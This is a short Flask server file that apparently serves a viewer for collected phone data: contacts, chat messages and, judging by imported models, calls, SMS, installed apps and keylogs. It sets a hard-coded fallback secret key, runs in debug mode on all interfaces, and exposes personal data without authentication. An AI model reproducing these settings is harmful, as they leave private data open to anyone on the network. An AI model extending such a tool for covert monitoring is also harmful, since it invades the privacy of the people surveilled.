import os
from flask import Flask, render_template, jsonify
from db import db  # Import db from the new file

app = Flask(__name__)

app.secret_key = os.environ.get("FLASK_SECRET_KEY") or "message_viewer_secret"
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///data.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db.init_app(app)

# Import models after initializing db to avoid circular imports
from models import Contact, ChatMessage, Call, SMS, InstalledApp, Keylog

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/contacts')
def get_contacts():
    contacts = Contact.query.all()
    return jsonify([{
        'name': contact.name,
        'phone': contact.phone_number,
        'email': contact.email,
        'last_contacted': contact.last_contacted
    } for contact in contacts])

@app.route('/sms/<contact_name>')
def get_messages(contact_name):
    messages = ChatMessage.query.join(Contact).filter(Contact.name == contact_name).all()
    return jsonify([{
        'time': message.time,
        'text': message.text,
        'sender': message.sender
    } for message in messages])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)